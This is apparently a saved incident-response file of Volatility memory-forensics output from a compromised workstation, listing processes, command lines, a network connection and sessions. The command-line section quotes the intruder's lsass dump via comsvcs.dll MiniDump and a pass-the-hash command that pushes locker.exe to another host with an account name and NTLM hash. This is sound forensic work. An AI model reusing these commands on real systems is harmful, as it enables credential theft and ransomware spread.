@@ -1,0 +1,33 @@
+# Volatility 3 Framework 2.7.0 on eng-ws14-20261107-0114.raw (memory image taken 01:14 UTC by the incident team)
+# Captured output: the image is 32 GB and stays with the evidence locker. This is the text the analyst saved.
+
+$ vol -f eng-ws14-20261107-0114.raw windows.pslist
+PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime
+
+4       0       System          0xc10e3f2a8040  212     -       N/A     False   2026-11-02 06:10:11.000000      N/A
+724     612     lsass.exe       0xc10e40b5e080  11      -       0       False   2026-11-02 06:10:19.000000      N/A
+1044    980     explorer.exe    0xc10e41c2d300  88      -       1       False   2026-11-06 20:14:40.000000      N/A
+5120    1044    solidcad.exe    0xc10e42a19080  41      -       1       False   2026-11-06 20:15:11.000000      N/A
+6120    1044    explorer.exe    0xc10e42b8c080  52      -       3       False   2026-11-06 22:52:40.000000      N/A
+6344    6120    cmd.exe         0xc10e42d71080  1       -       3       False   2026-11-06 22:54:02.000000      N/A
+6630    6344    rundll32.exe    0xc10e42f03080  0       -       3       False   2026-11-06 23:05:44.000000      2026-11-06 23:05:58.000000
+6711    6344    nt.exe          0xc10e42f9a080  0       -       3       False   2026-11-06 23:12:03.000000      2026-11-06 23:12:31.000000
+6790    6344    px.exe          0xc10e43011080  3       -       3       False   2026-11-06 23:19:50.000000      N/A
+
+$ vol -f eng-ws14-20261107-0114.raw windows.cmdline --pid 6630 6711 6790
+PID     Process Args
+
+6630    rundll32.exe    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 724 C:\Users\Public\lsass.dmp full
+6711    nt.exe          C:\Users\Public\r\nt.exe lsa C:\Users\Public\lsass.dmp
+6790    px.exe          C:\Users\Public\r\px.exe \\10.50.1.12 -u GARNET\adm.rjoshi -H aad3b435b51404eeaad3b435b51404ee:3f1c9e0a77d2c51b8e04a61d1b2f9a44 -s WinUpdSvc -f C:\Users\Public\r\locker.exe
+
+$ vol -f eng-ws14-20261107-0114.raw windows.netscan --pid 6790
+Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created
+
+0xc10e4310a8b0  TCPv4   10.50.2.14      50211   10.50.1.12      445     ESTABLISHED     6790    px.exe  2026-11-06 23:19:51.000000
+
+$ vol -f eng-ws14-20261107-0114.raw windows.sessions
+Session Type    Session ID      Process ID      Process Name    User Name       Create Time
+
+RDP-Tcp#3       3       6120    explorer.exe    GARNET/s.kale   2026-11-06 22:52:40.000000
+Console         1       1044    explorer.exe    GARNET/n.gokhale        2026-11-06 20:14:40.000000
